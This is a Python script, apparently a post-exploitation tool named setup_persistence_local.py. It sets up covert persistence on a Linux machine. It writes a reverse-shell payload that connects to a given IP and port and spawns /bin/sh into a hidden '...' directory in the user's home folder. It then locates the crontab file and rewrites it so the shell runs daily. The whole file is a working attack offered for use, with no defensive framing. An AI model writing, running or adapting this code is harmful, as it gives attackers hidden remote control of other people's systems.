from posixpath import expanduser
import sys, os, pathlib, subprocess

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def check_python_version():
    if sys.version_info[0] < 3:
        print("[!] Python 3.x is required to run this script.")
        sys.exit(1)

def find_crontab_file(search_str, rootdirs):

    for dirr in rootdirs:
        for folder, dirs, files in os.walk(dirr):
            for file in files:
                try:
                    fullpath = os.path.join(folder, file)
                    with open(fullpath, 'r') as f:
                        for line in f:
                            if search_str in line:
                                return fullpath
                except:
                    pass

def crontab(ip, port):
    output = subprocess.run(['which','crontab'], check=True, stdout=subprocess.PIPE).stdout
    crontab_path = output.decode('utf-8').strip()
    if not os.path.isfile(crontab_path):
        print("[!] Crontab not found.")
        return
    else:
        curr = subprocess.run([crontab_path, '-l'], check=True, stdout=subprocess.PIPE).stdout
        print(f"{bcolors.GREEN}[+] Current crontabs:{bcolors.ENDC}\n\n{curr.decode('utf-8')}" if curr else f"{bcolors.BLUE}[+] No crontabs found.{bcolors.ENDC}")
        if curr:
            filename = find_crontab_file(curr.decode('utf-8')[0:20], ["/var/", "/etc/", "/home/"])
            if not filename:
                print(f"{bcolors.WARNING}[!] Crontab file not found.{bcolors.ENDC}")
                return

            print(f"{bcolors.GREEN}[+] Crontab file found: {filename}{bcolors.ENDC}")
            print(f"{bcolors.GREEN}[+] Creating per.py file...{bcolors.ENDC}")

            subprocess.run(['mkdir', f'{os.environ["HOME"]}/...'], check=True, stdout=subprocess.DEVNULL)
            with open(f'{os.environ["HOME"]}/.../per.py', 'w') as f:
                f.write(f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""")

            print(f"{bcolors.GREEN}[+] Adding persistence to crontab file...{bcolors.ENDC}")
            with open(filename, 'w') as f:
                f.write(curr.decode('utf-8') + f'\n0 0 * * * python3 {os.environ["HOME"]}/.../per.py\n')

            print(f"{bcolors.GREEN}[+] Done adding crontab.{bcolors.ENDC}")


if __name__ == '__main__':
    check_python_version()
    try:
        ip = sys.argv[1]
        port = sys.argv[2]
    except:
        print("""
        Usage: python3 setup_persistence_local.py <ip> <port>
        Example: python3 setup_persistence_local.py 127.0.0.1 4444""")
        sys.exit(1)

    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        print("""
        Usage: python3 setup_persistence_local.py <ip> <port>
        Example: python3 setup_persistence_local.py 127.0.0.1 4444""")
        sys.exit(0)
    
    crontab(ip, port)